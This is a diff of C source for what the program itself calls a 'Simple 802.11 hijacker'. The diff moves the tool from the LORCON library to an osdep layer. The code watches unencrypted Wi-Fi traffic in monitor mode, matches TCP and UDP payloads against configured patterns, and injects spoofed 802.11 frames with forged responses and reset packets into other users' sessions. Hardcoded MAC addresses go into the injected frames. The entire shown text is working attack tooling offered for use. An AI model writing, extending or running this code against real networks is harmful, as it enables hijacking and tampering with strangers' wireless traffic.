@@ -13,36 +13,39 @@
 #include <netinet/udp.h>
 #include <netinet/ip_icmp.h>
 
-#include <lorcon2/lorcon.h> // For LORCON
-#include <lorcon2/lorcon_ieee80211.h> // For LORCON
-#include <lorcon2/lorcon_packasm.h>
-#include <lorcon2/lorcon_forge.h>
-
 #include <libnet.h>
 #include <pcap.h>
 
 #include <arpa/nameser.h>
 #include <resolv.h>
 
+#include "osdep/osdep.h"
+#include "ieee80211.h"
+
 #include "logger.h"
 #include "matchers.h"
+
 
 #define LLC_TYPE_IP 0x0800
 #define HOP_DEFAULT_TIMEOUT 5
 #define MTU 1400
-#define LORCON_DISPATCH_CNT 50
 
+// Can`t be > 4096
+#define MAX_PACKET_LENGTH 4096
 #define ALRM_TIME 5
 
 int debugged = 0;
 
 // context for holding program state
 struct ctx {
-    char *interface_inj;
-    char *interface_mon;
+    char *if_inj_name;
+    char *if_mon_name;
 
-    char *interface_inj_vap;
-    char *interface_mon_vap;
+    u_char inj_mac[6];
+    u_char mon_mac[6];
+
+    char *if_inj_vap;
+    char *if_mon_vap;
 
     u_int channels[14];
     u_int channel_fix;
@@ -52,8 +55,6 @@ struct ctx {
     libnet_ptag_t p_udp;
     libnet_ptag_t p_ip;
 
-    lorcon_packet_t *n_pack;
-
     u_int mtu;
 
     char *matchers_filename;
@@ -61,9 +62,10 @@ struct ctx {
     struct matcher_entry *matchers_list;
     u_int hop_time;
 
-    //LORCON structs
-    lorcon_t *context_inj;
-    lorcon_t *context_mon;
+    // OSDEP structs
+    struct wif *wi_inj;
+    struct wif *wi_mon;
+
 };
 
 int dead;
@@ -76,7 +78,8 @@ void usage(char *argv[]) {
     printf("\t-j <iface> : sets the inject interface\n");
     printf("\t-c <channels> : sets the channels for hopping(or not, if fix defined)\n");
     printf("\t-t <time> : hop sleep time in sec(default = 5 sec)\n");
-    printf("\t-l <file> : file describing configuration for matchers\n");
+    printf("\t-k <file> : file describing configuration for matchers\n");
+    printf("\t-l <file> : log to this file instead of stdout\n");
     printf("\t-u <mtu> : set MTU size(default 1400)\n");
     printf("\t-d : enable debug messages\n");
     printf("\t-f : fix channel, this will disable hopping and starts to always use first channel in list\n");
@@ -117,10 +120,10 @@ void hexdump (void *addr, u_int len) {
         if ((i % 16) == 0) {
             // Just don't print ASCII for the zeroth line.
             if (i != 0) {
-                printf ("  %s\n", buff);
+                printf("  %s\n", buff);
             }
             // Output the offset.
-            printf ("  %04x ", i);
+            printf("  %04x ", i);
         }
 
         // Now the hex code for the specific character.
@@ -342,103 +345,93 @@ int build_udp_packet(struct iphdr *ip_hdr, struct udphdr *udp_hdr, u_char *data,
     return 1;
 }
 
-lorcon_packet_t *build_wlan_packet(u_char *l2data, int l2datalen, lorcon_packet_t *packet, struct ctx *ctx) {
+u_short fnseq(u_short fn, u_short seq) {
+    
+    u_short r = 0;
 
-    lorcon_packet_t *n_pack;
-    u_char mac0[6];
-    u_char mac1[6];
-    u_char mac2[6];
-    u_char llc[8];
+    r = fn;
+    r |= ((seq % 4096) << IEEE80211_SEQ_SEQ_SHIFT);
+    return htole16(r);
+}
 
-    struct lorcon_dot11_extra *i_hdr;
-    i_hdr = (struct lorcon_dot11_extra *) packet->extra_info;
+int build_wlan_packet(u_char *l2data, u_int l2datalen, u_char *wldata, u_int *wldatalen, struct ctx *ctx) {
 
-    memcpy(&mac0, i_hdr->source_mac, 6);
-    memcpy(&mac1, i_hdr->dest_mac, 6);
-    memcpy(&mac2, i_hdr->bssid_mac, 6);
+    struct ieee80211_frame *wh = (struct ieee80211_frame*) wldata;
 
-    n_pack = malloc(sizeof(lorcon_packet_t));
-    memset(n_pack, 0, sizeof(lorcon_packet_t));
-    n_pack->lcpa = lcpa_init();
+    u_char *data = (u_char*) (wh+1);
+    u_short *sp;
 
-    lcpf_80211headers(
-        n_pack->lcpa,
-        WLAN_FC_TYPE_DATA, // type
-        WLAN_FC_SUBTYPE_DATA, // subtype
-        WLAN_FC_FROMDS, // direction WLAN_FC_FROMDS(dest,bssid,src)/WLAN_FC_TODS(bssid,src,dest)
-        0x00, // duration
-        mac0,
-        mac2,
-        mac2,
-        NULL, // addr4 ??
-        0, // fragment
-        1234 // Sequence number
-    );
+    *wldatalen = sizeof(struct ieee80211_frame);
+    
+    /* duration */
+    sp = (u_short*) wh->i_dur;
+//  *sp = htole16(32767);
+    *sp = htole16(0);
+    
+    /* seq */
+    sp = (u_short*) wh->i_seq;
+    *sp = fnseq(0, 1337);
 
-    // Alias the IP type
-    if (l2datalen > 14) {
-        llc[0] = 0xaa;
-        llc[1] = 0xaa;
-        llc[2] = 0x03;
-        llc[3] = 0x00;
-        llc[4] = 0x00;
-        llc[5] = 0x00;
-        llc[6] = 0x08; // here must be ip type, last two bytes 0x08, 0x00
-        llc[7] = 0x00;
-    }
-    n_pack->lcpa = lcpa_append_copy(n_pack->lcpa, "LLC", sizeof(llc), llc);
-    n_pack->lcpa = lcpa_append_copy(n_pack->lcpa, "DATA", l2datalen, l2data);
+    wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
+    wh->i_fc[1] |= IEEE80211_FC1_DIR_FROMDS;
 
-    // remember to free packet
-    return n_pack;
+    memcpy(wh->i_addr1, "\xdc\x85\xde\x55\x94\xb0", 6);
+    memcpy(wh->i_addr2, "\x00\x12\xbf\xca\xf9\x96", 6);
+    memcpy(wh->i_addr3, "\x00\x12\xbf\xca\xf9\x96", 6);
+
+    // LLC IP fill
+    memcpy(data, "\xAA\xAA\x03\x00\x00\x00\x08\x00", 8);
+    data += 8;
+    *wldatalen +=8;
+
+    memcpy(data, l2data, l2datalen);    
+    *wldatalen += l2datalen;
+
+    return 1;
 
 }
 
-int lorcon_send_packet(lorcon_packet_t *packet, struct ctx *ctx) {
+int send_packet(struct ieee80211_frame *wh, struct ctx *ctx) {
     
-    u_char *ip_data;
-    u_int ip_datalen;
+    u_char *l2data;
+    u_int l2datalen;
+
+    u_char wldata[2048];
+    u_int wldatalen;
+
+    int rc;
+
+    memset(wldata, 0, sizeof(wldata));
 
     // cull_packet will dump the packet (with correct checksums) into a
     // buffer for us to send via the raw socket. memory must be freed after that
-    if(libnet_adv_cull_packet(ctx->lnet, &ip_data, &ip_datalen) == -1) {
+    if(libnet_adv_cull_packet(ctx->lnet, &l2data, &l2datalen) == -1) {
         logger(WARN, "libnet_adv_cull_packet returns error: %s", libnet_geterror(ctx->lnet));
         return 0;
     }
 
-    // if we already have this pointer then we sending a round of packets in a cycle, no need to forge all 802.11 headers.
-    if(ctx->n_pack) {
-        lcpa_replace_copy(ctx->n_pack->lcpa, "DATA", ip_datalen, ip_data);
-    } else {
-        ctx->n_pack = build_wlan_packet(ip_data, ip_datalen, packet, ctx);
+    if(build_wlan_packet(l2data, l2datalen, wldata, &wldatalen, ctx)) {
+        rc = wi_write(ctx->wi_inj, wldata, wldatalen, NULL);
+        if(rc == -1) {
+            printf("wi_write() error\n");
+        }
     }
 
-    if(ctx->n_pack) {
-        //hexdump(ip_data, ip_datalen);
-
-        if (lorcon_inject(ctx->context_inj, ctx->n_pack) < 0) {
-            return 0;
-        } 
-    }
-    libnet_adv_free_packet(ctx->lnet, ip_data);
+    libnet_adv_free_packet(ctx->lnet, l2data);
 
     return 1;
 }
 
 void clear_packet(struct ctx *ctx) {
-    if(ctx->n_pack) {
-        lorcon_packet_free(ctx->n_pack);
-        ctx->n_pack = NULL;
-    }
     if(ctx->lnet) {
         libnet_clear_packet(ctx->lnet);
-        ctx->p_ip = 0;
-        ctx->p_tcp = 0;
-        ctx->p_udp = 0;
+        ctx->p_ip = LIBNET_PTAG_INITIALIZER;
+        ctx->p_tcp = LIBNET_PTAG_INITIALIZER;
+        ctx->p_udp = LIBNET_PTAG_INITIALIZER;
     }
 }
 
-void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorcon_packet_t *packet) {
+void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ieee80211_frame *wh, struct ctx *ctx) {
 
     struct iphdr *ip_hdr;
     struct tcphdr *tcp_hdr;
@@ -466,8 +459,8 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
     ip_hdr = (struct iphdr *) (dot3);
 
     logger(DBG, "IP id:%d tos:0x%x version:%d iphlen:%d dglen:%d protocol:%d ttl:%d", ntohs(ip_hdr->id), ip_hdr->tos, ip_hdr->version, ip_hdr->ihl*4, ntohs(ip_hdr->tot_len), ip_hdr->protocol, ip_hdr->ttl);
-    logger(DBG, "SRC: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)));
-    logger(DBG, "DST: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)));
+    logger(DBG, "IP src: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)));
+    logger(DBG, "IP dst: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)));
 
     if(ntohs(ip_hdr->tot_len) > dot3_len) {
         logger(DBG, "Ambicious len in IP header, skipping");
@@ -482,8 +475,8 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
          multiple this number by 4 */
         tcp_hdr = (struct tcphdr *) (dot3+sizeof(struct iphdr));
         tcp_datalen = ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - (tcp_hdr->doff * 4);
-        logger(DBG, "TCP src_port:%d dest_port:%d doff:%d datalen:%d ack:0x%x win:0x%x seq:%d", ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest), tcp_hdr->doff*4, tcp_datalen, ntohs(tcp_hdr->window), ntohl(tcp_hdr->ack_seq), ntohs(tcp_hdr->seq));
-        logger(DBG, "FLAGS %c%c%c%c%c%c",
+        logger(DBG, "TCP src_port:%d dest_port:%d doff:%d datalen:%d win:0x%x ack:%d seq:%d", ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest), tcp_hdr->doff*4, tcp_datalen, ntohs(tcp_hdr->window), ntohl(tcp_hdr->ack_seq), ntohs(tcp_hdr->seq));
+        logger(DBG, "TCP FLAGS %c%c%c%c%c%c",
                (tcp_hdr->urg ? 'U' : '*'),
                (tcp_hdr->ack ? 'A' : '*'),
                (tcp_hdr->psh ? 'P' : '*'),
@@ -499,7 +492,10 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
         tcp_data = (u_char*) tcp_hdr + tcp_hdr->doff * 4;
 
         if((matcher = get_response(tcp_data, tcp_datalen, ctx, MATCHER_PROTO_TCP, ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest)))) {
-            logger(INFO, "Matched TCP packet %s:%d -> %s:%d len:%d", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)), ntohs(tcp_hdr->source), inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)), ntohs(tcp_hdr->dest),tcp_datalen);
+            logger(INFO, "Matched TCP packet %s:%d -> %s:%d len:%d", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)), ntohs(tcp_hdr->source), inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)), ntohs(tcp_hdr->dest), tcp_datalen);
+
+            // TODO normal memcpy
+            logger(INFO, "IP dst: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)));
 
             tcpseqnum = ntohl(tcp_hdr->ack_seq);
             for(frag_offset = 0; frag_offset < matcher->response_len; frag_offset += ctx->mtu) {
@@ -522,7 +518,7 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
                 }
                 tcpseqnum = tcpseqnum + frag_len;
 
-                if(!lorcon_send_packet(packet, ctx)) {
+                if(!send_packet(wh, ctx)) {
                     logger(WARN, "Cannot inject TCP packet");
                 }
             }
@@ -535,11 +531,12 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
                     // clear packet?
                     break;
                 }
-                if(!lorcon_send_packet(packet, ctx)) {
+                if(!send_packet(wh, ctx)) {
                     logger(WARN, "Cannot inject TCP reset packet");
                 }
                 logger(INFO, "TCP reset packet successfully injected");
             }
+            
             clear_packet(ctx);
         }
         break;
@@ -570,7 +567,7 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
                     // clear packet?
                     break;
                 }
-                if(!lorcon_send_packet(packet, ctx)) {
+                if(!send_packet(wh, ctx)) {
                     logger(WARN, "Cannot inject UDP packet");
                 }
             }
@@ -584,9 +581,11 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
                     // clear packet?
                     break;
                 }
-                if(lorcon_send_packet(packet, ctx)) {
+
+                if(send_packet(wh, ctx)) {
                     logger(WARN, "Cannot inject UDP reset packet");
                 }
+
                 logger(INFO, "UDP reset packet successfully injected");
             }
             clear_packet(ctx);
@@ -604,156 +603,214 @@ void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorc
     }
 }
 
-/*
-* Called by lorcon_loop for every packet
-*/
-void process_wlan_packet(lorcon_packet_t *packet, struct ctx *ctx) {
 
-    struct lorcon_dot11_extra *i_hdr;
-    char ssid_name[256];
+void read_beacon(struct ctx *ctx, struct ieee80211_frame *wh, int len) {
 
-    logger(DBG, "Packet, dlt: %d len: %d h_len: %d d_len: %d", packet->dlt, packet->length, packet->length_header, packet->length_data);
+    ieee80211_mgt_beacon_t wb = (ieee80211_mgt_beacon_t) (wh+1);
+    int bhlen = 12;
+    char ssid[256];
+    int got_ssid = 0, got_channel = 0;
 
-    if(packet->extra_type != LORCON_PACKET_EXTRA_80211 || packet->extra_info == NULL) {
-        logger(WARN, "Packet has no extra, cannot be parsed");
-        hexdump((u_char *) packet->packet_raw, packet->length);
+    len -= sizeof(*wh) + bhlen;
+    if (len < 0) {
+        logger(WARN, "Short beacon %d", len);
         return;
     }
 
-    i_hdr = (struct lorcon_dot11_extra *) packet->extra_info;
-    if(i_hdr->type == WLAN_FC_TYPE_DATA) { // data frames
+    wb += bhlen; 
+    while (len > 1) {
+        u_char ie_len = wb[1];
+        len -= 2 + ie_len;
+        if (len < 0) {
+            logger(WARN, "Short IE %d %d", len, ie_len);
+            return;
+        }
+        
+        switch (wb[0]) {
+            case IEEE80211_ELEMID_SSID:
+                if (!got_ssid) {
+                    strncpy(ssid, (char*) &wb[2], ie_len);
+                    ssid[ie_len] = '\0';
+                    if(strlen(ssid)) {
+                        got_ssid = 1;
+                    }
+                } 
+                break;
+            case IEEE80211_ELEMID_DSPARMS:
+                if (!got_channel)
+                    got_channel = wb[2];
+                break;
+        }
 
-        logger(DBG, "IEEE802.11 data, type:%d subtype:%d direction:%s protected:%c src_mac:[%02X:%02X:%02X:%02X:%02X:%02X] dst_mac:[%02X:%02X:%02X:%02X:%02X:%02X] bssid_mac:[%02X:%02X:%02X:%02X:%02X:%02X]",
-               i_hdr->type,
-               i_hdr->subtype,
-               i_hdr->from_ds ? "from_ds -->":"to_ds <--",
-               i_hdr->protected ? 'y':'n',
-               i_hdr->source_mac[0], i_hdr->source_mac[1], i_hdr->source_mac[2], i_hdr->source_mac[3], i_hdr->source_mac[4], i_hdr->source_mac[5],
-               i_hdr->dest_mac[0], i_hdr->dest_mac[1], i_hdr->dest_mac[2], i_hdr->dest_mac[3], i_hdr->dest_mac[4], i_hdr->dest_mac[5],
-               i_hdr->bssid_mac[0], i_hdr->bssid_mac[1], i_hdr->bssid_mac[2], i_hdr->bssid_mac[3], i_hdr->bssid_mac[4], i_hdr->bssid_mac[5]);
-
-        if(i_hdr->protected) {
-            logger(DBG, "\tWe are not interested in protected packets, skipping it");
+        if (got_ssid && got_channel) {
+            logger(DBG, "Beacon frame SSID: %s Channel: %d", ssid, got_channel);
             return;
         }
 
-        if(!(i_hdr->to_ds) || i_hdr->from_ds) {
-            logger(DBG, "\tPacket from DS, skipping it");
-            return;
-        }
+        wb += 2 + ie_len;
+    } 
+}
 
-        switch(i_hdr->subtype) {
-        case WLAN_FC_SUBTYPE_QOSDATA:
-            if(packet->length_data == 0) {
-                logger(DBG, "\tWe are not interested in empty packets, skipping it");
-                break;
-            }
+void read_mgt(struct ctx *ctx, struct ieee80211_frame *wh, int len) {
 
-            switch(htons(i_hdr->llc_type)) {
-
-            case LLC_TYPE_IP:
-                process_ip_packet(packet->packet_data, packet->length_data, ctx, packet);
-                break;
-            default:
-                logger(DBG, "\tLLC said that packet has no IP layer, skipping it");
-                break;
-            }
-
-            break;
-        case WLAN_FC_SUBTYPE_DATA:
-            // sometimes this data is coming from DS to client.
-            break;
-        }
-
-    } else if(i_hdr->type == WLAN_FC_TYPE_MGMT) { // management frames
-        switch(i_hdr->subtype) {
-        case WLAN_FC_SUBTYPE_BEACON:
-            get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
-            logger(DBG, "IEEE802.11 beacon frame, ssid: (%s)", ssid_name);
-            break;
-        case WLAN_FC_SUBTYPE_PROBEREQ:
-            get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
-            logger(DBG, "IEEE802.11 probe request, ssid: (%s)", ssid_name);
-            break;
-        case WLAN_FC_SUBTYPE_PROBERESP:
-            get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
-            logger(DBG, "IEEE802.11 probe response, ssid: (%s)", ssid_name);
-            break;
-        }
-    } else if(i_hdr->type == WLAN_FC_TYPE_CTRL) { // control frames
-        // NOTHING HERE
+    if (len < (int) sizeof(*wh)) {
+        logger(DBG, "802.11 too short management packet: %d, skipping it", len);
+        return;
     }
+    switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
+        case IEEE80211_FC0_SUBTYPE_BEACON:
+        case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
+            read_beacon(ctx, wh, len);
+            break;
 
-    lorcon_packet_free(packet);
+        case IEEE80211_FC0_SUBTYPE_AUTH:
+            //read_auth(es, wh, len);
+            break;
+
+        case IEEE80211_FC0_SUBTYPE_PROBE_REQ:
+        case IEEE80211_FC0_SUBTYPE_ASSOC_REQ:
+            break;
+
+        case IEEE80211_FC0_SUBTYPE_DEAUTH:
+            //read_deauth(es, wh, len);
+            break;
+
+        case IEEE80211_FC0_SUBTYPE_DISASSOC:
+            //read_disassoc(es, wh, len);
+            break;
+
+        case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
+            //read_assoc_resp(es, wh, len);
+            break;
+
+        default:
+            logger(DBG, "Unknown mgmt subtype 0x%02X", wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK);
+        break;
+    }    
+    
+}
+
+void read_ack(struct ctx *ctx, struct ieee80211_frame *wh, int len) {
+    //printf("Ack\n");
+}
+
+void read_ctl(struct ctx *ctx, struct ieee80211_frame *wh, int len) {
+    switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
+    case IEEE80211_FC0_SUBTYPE_ACK:
+        read_ack(ctx, wh, len);
+        break;
+
+    case IEEE80211_FC0_SUBTYPE_RTS:
+    case IEEE80211_FC0_SUBTYPE_CTS:
+    case IEEE80211_FC0_SUBTYPE_PS_POLL:
+    case IEEE80211_FC0_SUBTYPE_CF_END:
+        break;
+
+    default:
+        logger(DBG, "Unknown ctl subtype %x\n", wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK);
+        break;
+    }
 }
 
 
-void process_packet(lorcon_t *context, lorcon_packet_t *packet, u_char *user) {
+void read_data(struct ctx *ctx, struct ieee80211_frame *wh, int len) {
 
-    struct ctx *ctx;
-    ctx = (struct ctx *) user;
+    u_char *p = (u_char*) (wh + 1);
+    int protected = wh->i_fc[1] & IEEE80211_FC1_WEP;
+    int stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;
 
-    if(dead) {
-        lorcon_breakloop(context);
-    } else {
-        process_wlan_packet(packet, ctx);
+    // Remove 802.11 header
+    len -= sizeof(*wh);
+    
+    // Remove QOS header
+    switch(stype) {
+        case IEEE80211_FC0_SUBTYPE_QOS:
+        case IEEE80211_FC0_SUBTYPE_QOS_NULL:
+        case IEEE80211_FC0_SUBTYPE_CF_ACK:
+        case IEEE80211_FC0_SUBTYPE_CF_POLL:
+        case IEEE80211_FC0_SUBTYPE_CF_ACPL:
+            p += 2;
+            len -= 2;
+    }
+   
+    // Remove LLC header(if exist)
+    if (!protected && len >= 8 && (p[0] == 0xaa && p[1] == 0xaa && p[2] == 0x03)) {
+
+        //802.1x auth LLC
+        if(memcmp(p, "\xaa\xaa\x03\x00\x00\x00\x88\x8e", 8) == 0) {
+            // this is eapol handshake
+        }
+
+         //IP layer LLC
+        if(memcmp(p, "\xaa\xaa\x03\x00\x00\x00\x08\x00", 8) == 0) {
+            //packet has ip layer
+        }
+
+        p += 8;
+        len -= 8;
+    }
+
+    // Remove CCMP && TKIP init vector
+    if (protected && len >= 8) {
+
+        // TODO check
+
+        p += 8;
+        len -= 8;
+    }
+
+    if (len > 0) {
+        process_ip_packet(p, len, wh, ctx);
+        //hexdump(p, len);
     }
 }
 
-lorcon_t *init_lorcon_interface(const char *interface) {
+void process_packet(u_char *pkt, int len,  struct rx_info *rxi, struct ctx *ctx) {
 
-    lorcon_driver_t *driver; // Needed to set up interface/context
-    lorcon_t *context; // LORCON context
-    u_char *mac;
-    u_int r;
+    logger(DBG, "ri_channel: %d", rxi->ri_channel);
+    logger(DBG, "ri_power: %d", rxi->ri_power);
+    logger(DBG, "ri_noise: %d", rxi->ri_noise);
+    logger(DBG, "ri_rate: %d", rxi->ri_rate);
 
-    // Automatically determine the driver of the interface
+    struct ieee80211_frame *wh = (struct ieee80211_frame *) pkt;
+    logger(DBG, "IEEE802.11 frame type:0x%02X subtype:0x%02X protected:%s direction:%s addr1:[%02X:%02X:%02X:%02X:%02X:%02X] addr2:[%02X:%02X:%02X:%02X:%02X:%02X] addr3:[%02X:%02X:%02X:%02X:%02X:%02X]",
+                wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK,
+                wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK,
+                wh->i_fc[1] & IEEE80211_FC1_WEP ? "y":"n",
+                wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS ? "from_ds -->":"to_ds <--", // wh->i_fc[1] & IEEE80211_FC1_DIR_TODS
+                wh->i_addr1[0], wh->i_addr1[1], wh->i_addr1[2], wh->i_addr1[3], wh->i_addr1[4], wh->i_addr1[5],
+                wh->i_addr2[0], wh->i_addr2[1], wh->i_addr2[2], wh->i_addr2[3], wh->i_addr2[4], wh->i_addr2[5],
+                wh->i_addr3[0], wh->i_addr3[1], wh->i_addr3[2], wh->i_addr3[3], wh->i_addr3[4], wh->i_addr3[5]);
 
-    if ((driver = lorcon_auto_driver(interface)) == NULL) {
-        logger(FATAL, "Could not determine the driver for %s", interface);
-        return NULL;
-    }
-    logger(INFO, "Interface: %s, Driver: %s", interface, driver->name);
+    switch (wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK) {
+        case IEEE80211_FC0_TYPE_MGT: // management frame
+            read_mgt(ctx, wh, len);
+            break;
 
-    // Create LORCON context for interface
-    if ((context = lorcon_create(interface, driver)) == NULL) {
-        logger(FATAL, "Failed to create context");
-        return NULL;
-    }
+        case IEEE80211_FC0_TYPE_CTL:
+            read_ctl(ctx, wh, len);
+            break;
 
-    // set vap name
-    //lorcon_set_vap(context, "mon0");
-
-    // Create inject+monitor mode interface
-    if (lorcon_open_injmon(context) < 0) {
-        logger(FATAL, "Could not create inject+monitor mode interface!");
-        return NULL;
-    }
-
-    r = lorcon_get_hwmac(context, &mac);
-    if(r < 0 ) {
-        logger(WARN, "Fail to fetch HW addr from: %s", interface);
-    } else if (r == 0) {
-        logger(WARN, "HW addr is not set on: %s", interface);
+        case IEEE80211_FC0_TYPE_DATA:
+            read_data(ctx, wh, len);
+            break;
+        default:
+            logger(DBG, "Unknown frame type: 0x%02X", wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK);
     }
 
-    logger(INFO, "VAP: %s, HW: %02x:%02x:%02x:%02x:%02x:%02x", lorcon_get_vap(context), mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 
-    lorcon_free_driver_list(driver);
-
-    return context;
-}
-
-void clear_lorcon_interface(lorcon_t *context) {
-    // Close the monitor interface
-    lorcon_close(context);
-
-    // Free the monitor LORCON Context
-    lorcon_free(context);
 }
 
 void *loop_thread(void *arg) {
+    fd_set rfds;
+    int retval;
+    int caplen;
+    u_char pkt[MAX_PACKET_LENGTH];
+
     struct ctx *ctx = (struct ctx *)arg;
+
+    struct rx_info *rxi;
+    rxi = malloc(sizeof(struct rx_info));
 
     logger(DBG, "Main loop started");
     while(1) {
@@ -761,9 +818,42 @@ void *loop_thread(void *arg) {
             logger(DBG, "Got dead! Loop thread is closing now");
             return NULL;
         }
-        lorcon_dispatch(ctx->context_mon, LORCON_DISPATCH_CNT, process_packet, (u_char*)ctx);
+
+        bzero(rxi, sizeof(struct rx_info));
+
+        FD_ZERO (&rfds);
+        FD_SET (wi_fd(ctx->wi_mon), &rfds);
+        retval = select (FD_SETSIZE, &rfds, NULL, NULL, NULL);
+        if (retval == -1) {
+            logger(DBG, "select() error");
+        } else if (retval) {
+            if (FD_ISSET (wi_fd(ctx->wi_mon), &rfds)) {
+                caplen = wi_read (ctx->wi_mon, pkt, MAX_PACKET_LENGTH, rxi);
+                if (caplen == -1) {
+                    logger(DBG, "caplen == -1, wi_read return no packets");
+                    continue;
+                }
+                process_packet(pkt, caplen, rxi, ctx); 
+
+            }
+        }
     }
     return NULL;
+}
+
+int channel_change(struct ctx *ctx, int channel) {
+
+    if(wi_set_channel(ctx->wi_mon, channel) == -1) {
+        logger(WARN, "Fail to set monitor interface channel to %d", channel);
+        return 0;
+    }
+
+    // No need to change channel twice if mon == inj
+    if((wi_fd(ctx->wi_mon) != wi_fd(ctx->wi_inj)) && wi_set_channel(ctx->wi_inj, channel) == -1) {
+        logger(WARN, "Fail to set inject interface channel to %d", channel);
+        return 0;
+    }
+    return 1;
 }
 
 void *channel_thread(void *arg) {
@@ -774,8 +864,11 @@ void *channel_thread(void *arg) {
     if(ctx->channel_fix) {
         // set first in array
         logger(INFO, "Default channel set: %d", ctx->channels[0]);
-        lorcon_set_channel(ctx->context_inj, ctx->channels[0]);
-        lorcon_set_channel(ctx->context_mon, ctx->channels[0]);
+
+        if(!channel_change(ctx, ctx->channels[0])) {
+            return NULL;
+        }
+
     } else {
         // enter loop
         while(1) {
@@ -785,9 +878,10 @@ void *channel_thread(void *arg) {
                     return NULL;
                 }
                 if(!ctx->channels[ch_c]) break;
-                logger(DBG, "Periodical channel change: %d", ctx->channels[ch_c]);
-                lorcon_set_channel(ctx->context_inj, ctx->channels[ch_c]);
-                lorcon_set_channel(ctx->context_mon, ctx->channels[ch_c]);
+                logger(INFO, "Periodical channel change: %d", ctx->channels[ch_c]);
+                if(!channel_change(ctx, ctx->channels[ch_c])) {
+                    return NULL;
+                }
                 sleep(ctx->hop_time);
             }
         }
@@ -819,6 +913,9 @@ int main(int argc, char *argv[]) {
     ctx->matchers_filename = MATCHERS_DEFAULT_FILENAME;
     ctx->log_filename = NULL;
 
+    // init libnet tags
+    ctx->p_ip = ctx->p_tcp = ctx->p_udp = LIBNET_PTAG_INITIALIZER;
+
     printf ("%s - Simple 802.11 hijacker\n", argv[0]);
     printf ("-----------------------------------------------------\n\n");
 
@@ -827,14 +924,14 @@ int main(int argc, char *argv[]) {
     while ((c = getopt(argc, argv, "i:c:j:m:ft:l:k:hdu:")) != EOF) {
         switch (c) {
         case 'i':
-            ctx->interface_inj = strdup(optarg);
-            ctx->interface_mon = strdup(optarg);
+            ctx->if_inj_name = strdup(optarg);
+            ctx->if_mon_name = strdup(optarg);
             break;
         case 'j':
-            ctx->interface_inj = strdup(optarg);
+            ctx->if_inj_name = strdup(optarg);
             break;
         case 'm':
-            ctx->interface_mon = strdup(optarg);
+            ctx->if_mon_name = strdup(optarg);
             break;
         case 'c':
             ch_c = 0;
@@ -876,14 +973,14 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    if (getuid() != 0) {
+    if (geteuid() != 0) {
         (void) fprintf(stderr, "You must be ROOT to run this!\n");
         return -1;
     }
 
     signal(SIGINT, sig_handler);
 
-    if (ctx->interface_inj == NULL || ctx->interface_mon == NULL || !ctx->channels[0]) {
+    if (ctx->if_inj_name == NULL || ctx->if_mon_name == NULL || !ctx->channels[0]) {
         (void) fprintf(stderr, "Interfaces or channel not set (see -h for more info)\n");
         return -1;
     }
@@ -911,26 +1008,32 @@ int main(int argc, char *argv[]) {
     }
 
     ctx->lnet = libnet_init(LIBNET_LINK_ADV, "lo", lnet_err);
+    //ctx->lnet = libnet_init(LIBNET_RAW4, "wlan0mon", lnet_err);
     if(ctx->lnet == NULL) {
         logger(FATAL, "Error in libnet_init: %s", lnet_err);
         return -1;
     }
 
+    
     // The following is all of the standard interface, driver, and context setup
-    logger(INFO, "Initializing %s interface for inject", ctx->interface_inj);
-    if((ctx->context_inj = init_lorcon_interface(ctx->interface_inj)) == NULL) {
-        logger(FATAL, "Fail to initialize inject interface: %s", ctx->interface_inj);
+    if(!(ctx->wi_mon = wi_open(ctx->if_mon_name))) {
+        logger(FATAL, "Fail to initialize monitor interface: %s", ctx->if_mon_name);
         return -1;
     }
-
-    logger(INFO, "Initializing %s interface for monitor", ctx->interface_mon);
-    if((ctx->context_mon = init_lorcon_interface(ctx->interface_mon)) == NULL) {
-        logger(FATAL, "Fail to initialize monitor interface: %s", ctx->interface_mon);
-        return -1;
+    wi_get_mac(ctx->wi_mon, ctx->mon_mac);
